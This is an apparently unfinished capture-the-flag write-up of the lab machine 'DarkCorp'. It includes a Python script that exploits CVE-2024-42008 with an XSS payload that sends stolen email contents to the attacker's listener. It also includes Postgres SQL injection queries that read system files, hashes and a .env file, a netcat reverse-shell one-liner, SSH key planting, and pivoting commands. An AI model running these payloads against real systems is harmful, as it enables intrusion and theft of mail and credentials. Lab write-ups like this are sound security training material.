# DarkCorp (Unfinished Writeup)

Difficulty: Insane
OS: Windows
Category: Offensive

![93fba06a4780b65be5a5a4f9512b8e78.webp](93fba06a4780b65be5a5a4f9512b8e78.webp)

## I got lazy writing this lol

### Reconnaissance

Using `nmap -sCV [target] -oN darkcorp-scans` 

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**NOTE: Remember to add the hosts “drib.htb” and the following hosts later**

Access the website as seen on port 80 by nmap

Looking at the well designed website, if we scroll at the bottom we can see a *Contact Us* part

You can try to test it out, and try sending a message without properly inputting an email *e.g. email@email.com*

![image.png](image.png)

### Drip Email

Try to register and log in

This will take you to the dashboard.

Click on the *About* button and you’ll see its version number

By searching through *Google* we can see there’s a [CVE-2024-42008]([https://securityvulnerability.io/vulnerability/CVE-2024-42008](https://securityvulnerability.io/vulnerability/CVE-2024-42008))

Here are some information about the vulnerability:

![image.png](image%201.png)

![image.png](image%202.png)

```python
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin)
foo=bar">
Foo
</body>
```

But there is also a condition here, it must be an HTML email:

![image.png](image%203.png)

### Testing the Payload

Test the vulnerability by sending an email at yourself.

```python
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin)
foo=bar">
Foo
</body>
```

But the thing is, this did not work on me, it only returned an html code itself . Interpreting the payload as a string that is just a message.

I tried going back to the homepage where we can send a message. Intercept the request using BurpSuite, then send another message.

![image.png](image%204.png)

Unforetunately, the recipient is to *support@drip.htb*. Our **GOAL** is to read other user’s email witha *cross-site scripting* payload. 

To test, modify the *recipient* to your email. This will send the content to your email.

![image.png](image%205.png)

It worked!

I tried replacing the *message* with an XSS payload but it does not work on me.

![image.png](image%206.png)

So I tried another method, as I look around I found this python script that will automate the exploit.

```python
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import threading
from lxml import html

# Config
TARGET_URL = 'http://drip.htb/contact'
LISTEN_PORT = 8001
LISTEN_IP = '0.0.0.0'

# Payload data
start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
message = input("uid: ")
end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://[tun0 IP]:8001/c=${btoa(t)}`)) foo=bar">Foo</body>'

post_data = {
    'name': 'user',
    'email': 'bcase@drip.htb',
    'message': f"{start_mesg}{message}{end_mesg}",
    'content': 'html',
    'recipient': 'bcase@drip.htb'
}
print(f"{start_mesg}{message}{end_mesg}")

# Header for POST
headers = {
    'Host': 'drip.htb',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://drip.htb',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://drip.htb/index',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiMTIzMTJhZjk2ZmNlYzU0Yjc5Mzc4MzRlYzVjOTI3Zjk0NmY4NTNmMiJ9.aA7kcA.MHXF8_zMtrpOVrJSXPAvxeg9u14',
    'Connection': 'close'
}

def send_post():
    response = requests.post(TARGET_URL, data=post_data, headers=headers)
    print(f"[+] POST Request Sent! Status Code: {response.status_code}")

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/c=' in self.path:
            encoded_data = self.path.split('/c=')[1]
            decoded_data = base64.b64decode(encoded_data).decode('latin-1')
            print(f"[+] Received data {decoded_data}")
            tree = html.fromstring(decoded_data)

            # XPath query to find the div with id 'messagebody'
            message_body = tree.xpath('//div[@id="messagebody"]')
           
            # Check if the div exists and extract the content
            if message_body:
                # Extract inner text, preserving line breaks
                message_text = message_body[0].text_content().strip()
                print("[+] Extracted Message Body Content:\n")
                print(message_text)
            else:
                print("[!] No div with id 'messagebody' found.")

        else:
            print("[!] Received request but no data found.")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, format, *args):
        return  # Suppress default logging
    
def start_server():
    server_address = (LISTEN_IP, LISTEN_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"[+] Listening on port {LISTEN_PORT} for exfiltrated data...")
    httpd.serve_forever()
    
# Run the HTTP server in a separate thread
server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

# Send the POST request
send_post()

# Keep the main thread alive to continue listening
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\n[+] Stopping server.")
```

Now run the python code and adjust the *uid* input starting from 1.

If the *uid* is 2, you’ll get this message.

![image.png](image%207.png)

Then visit that link and it will give you access denied.

Generate the reset token by going to [`http://dev-a3f1-01.drip.htb/forgot`](http://dev-a3f1-01.drip.htb/forgot) . Then use the python epxloit again and input the *uid* 3 or 4.

You will get the reset token, visit the link, change the password, then login as use *bcase*

### Foothold

On the search bar, type anything and it will return an **SQL** error

![image.png](image%208.png)

This is an SQL error particularly **Postgres** with the following query:

```python
''; SELECT pg_read_file('/etc/hosts', 0, 2000);
```

For `/etc/passwd` 

```python
''; SELECT pg_read_file('/etc/hosts', 0, 2000);

<SNIP>
ntpsec:x:107:116::/nonexistent:/usr/sbin/nologin
sssd:x:108:117:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
_chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
```

Query the database

```python
''; SELECT datname FROM pg_database;
```

Query the Tables;

```python
''; SELECT tablename FROM pg_tables;
```

List Directories

```python
''; SELECT * FROM pg_ls_dir('/var/log/postgresql/');
```

Let’s get the password hashes in both **Users** and **Admins**

```python
''; (SELECT password FROM "Users") --
''; (SELECT password FROM "Admins") --
```

The hashes obtained are useless and only one is crackable

```python
d9b9ecbf29db8054b21f303072b37c4e
1eace53df87b9a15a37fdc11da2d298d
0cebd84e066fd988e89083879e88c5f9
d6ca3fd0c3a3b462ff2b83436dda495e
```

We can look at the database logs, first view the version

```python
''; SELECT version();
```

Then, you can read the logs at:

```python
''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log', 0, 100000000);
```

The hashes of the user *ebelford* can be found here

```python
''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0, 100000000);
```

Then you can crack the hash at [crackstation]([https://crackstation.net/](https://crackstation.net/))

In our attacker’s machine connect to the ssh:

```python
sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no ebelford@drip.htb
```

We find the backups from postgres from the database user at:

```python
ls -la /var/backups | grep postgres
```

In order to view the following directory we need a postgres user. Find the database details at

```python
ls -la /var/www/html/dashboard/
```

You will see a **.env** file, view it and you will see the juicy contents of it. Alternatively, you can view this file using an SQL query with:

```python
''; SELECT pg_read_file('/var/www/html/dashboard/.env', 0, 10000000);
```

You will find the contents

```python
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

We can get a shell out of this info. In your attacker’s machine, you can use `metasploit` or `rlwrap nc -lnvp 4455` depends on your preference, just setup a listener.

Then, in the victim’s machine in ssh, connect to the database with:

```python
PGPASSWORD=2Qa2SsBkQvsc psql -h localhost -U dripmail_dba -d dripmail
```

You will be inside the database, then input the command to establish a bounce shell

```python
COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat
/tmp/f|bash -i 2>&1|nc 10.10.14.15 4455 >/tmp/f';
```

Then put your ssh public key in the victim’s machine. Remember to replace the contents of the *echo* with your ssh public key. 

```python
mkdir -p ~/.ssh  
echo "ssh-ed25519
AAAAC3NzaC1lZDI1NTE5AAAAIGPqkrmvSthuwL/gpIhNJ7ioSieOV53BZH4bMDKalyMF
kiberdruzhinnik@vm" > ~/.ssh/authorized_keys
```

You can generate your own public key with this in your attacker’s machine

```python
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519
```

Then ssh to the attacker’s machine with the user *postgres* you will have to enter your passphrase if there are any

```python
ssh postgres@drip.htb
```

Look in the backups directory again you will see a file `dev-dripmail.old.sql.gpg` we can decrypt it with **gpg**

```python
gpg homedir /var/lib/postgresql/.gnupg pinentry-mode=loopback passphrase
'2Qa2SsBkQvsc' decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg >
/var/backups/postgres/dev-dripmail.old.sql
```

Then look inside its content we will get the user **victor.r**

```python
1       bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
```

Crack the hash passwords for *victor.r* then you’ll get its password.

### Pivoting

I did countless of trial and errors when pivoting, the first thing to do is to establish a proxy. I tried using chisel with socks connection, metasploit autoroute with socks connection but to no avail. What I used is **ligolo**. Just *scp* the agent to the victim and your proxy to yourself. This will allow us to scan the internal network and service detection more.

You can download the ligolo here [Ligolo](https://github.com/Nicocha30/ligolo-ng/releases)

In your attacker machine 

```python
./proxy -selfcert -laddr 0.0.0.0:11601
```

Modify your interface for this to work

```python
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Set a static address
sudo ip addr add 172.16.20.100/24 dev ligolo
```

If there are still errors, please refer to *online research* or *openai*. These are the core configurations

Then on the victim machine

```python
./agent -connect 10.10.14.15:11601 -ignore-cert
```

Then on your ligolo proxy

```python
session # select the victim's session
start

# Then route
sudo ip route add 172.16.20.0/24 dev ligolo
```

You can then nmap scan the 2 address we found earlier, here are the results.

```python
Nmap scan report for 172.16.20.1
Host is up (0.34s latency).

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|_ 256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
53/tcp open domain Simple DNS Plus
80/tcp open http nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-08 23:07:15Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb0., Site: Default-First-SiteName)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp
| Not valid before: 2025-01-22T12:09:55
|_Not valid after: 2124-12-29T12:09:55
|_ssl-date: TLS randomness does not represent time
443/tcp open ssl/http Microsoft IIS httpd 10.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DARKCORP-DC-01-CA
| Not valid before: 2024-12-29T23:24:10
|_Not valid after: 2034-12-29T23:34:10
| tls-alpn:
|_ http/1.1
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb0., Site: Default-First-SiteName)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp
| Not valid before: 2025-01-22T12:09:55
|_Not valid after: 2124-12-29T12:09:55
2179/tcp open vmrdp?
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb0., Site: Default-First-SiteName)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp
| Not valid before: 2025-01-22T12:09:55
|_Not valid after: 2124-12-29T12:09:55
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb0., Site: Default-First-SiteName)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp
| Not valid before: 2025-01-22T12:09:55
|_Not valid after: 2124-12-29T12:09:55
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open mc-nmf .NET Message Framing
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
53766/tcp open msrpc Microsoft Windows RPC
59733/tcp open msrpc Microsoft Windows RPC
59741/tcp open msrpc Microsoft Windows RPC
59812/tcp open msrpc Microsoft Windows RPC
59817/tcp open msrpc Microsoft Windows RPC
Service Info: Host: DC-01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2025-02-08T23:08:38
|_ start_date: N/A
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.44 seconds
```

```python
Nmap scan report for 172.16.20.2
Host is up (0.84s latency).

PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
5000/tcp open http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-ntlm-info:
| Target_Name: darkcorp
| NetBIOS_Domain_Name: darkcorp
| NetBIOS_Computer_Name: WEB-01
| DNS_Domain_Name: darkcorp.htb
| DNS_Computer_Name: WEB-01.darkcorp.htb
| DNS_Tree_Name: darkcorp.htb
|_ Product_Version: 10.0.20348
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
| Negotiate
|_ NTLM
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
49672/tcp open msrpc Microsoft Windows RPC
49677/tcp open msrpc Microsoft Windows RPC
49699/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2025-02-08T23:06:52
|_ start_date: N/A
|_nbstat: NetBIOS name: WEB-01, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:84:03:03
(Microsoft)
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled but not required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.20 seconds
```

Then let’s look at `172.16.20.2` 

![image.png](image%209.png)

We can access port 5000 with the credentials of `victor.r:victor1gustavo@#`

![image.png](image%2010.png)

Let’s enumerate the domain using `bloodhound-python` 

Add `172.16.20.2 WEB-01 WEB-01.darkcorp.htb` on your `/etc/hosts` 

We will use `proxychains4` to dump the domain for bloodhound

```python
$ sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no -D 1080
ebelford@drip.htb

# if you don't have proxychains yet
$ sudo apt install proxychains4

# Then edit your proxychains conf
$ sudo nano /etc/proxychains4.conf

# fix IP address resolution via DNAT
# if you don't do it, DNS returns a public IP, but we need a private one
dnat 10.129.91.115 172.16.20.1
[ProxyList]
socks5 127.0.0.1 1080

$ proxychains4 bloodhound-python -u victor.r@darkcorp.htb -p 'victor1gustavo@#' -
dc dc-01.darkcorp.htb dns-tcp -ns 172.16.20.1 dns-timeout 10 -c ALL -d
darkcorp.htb zip
```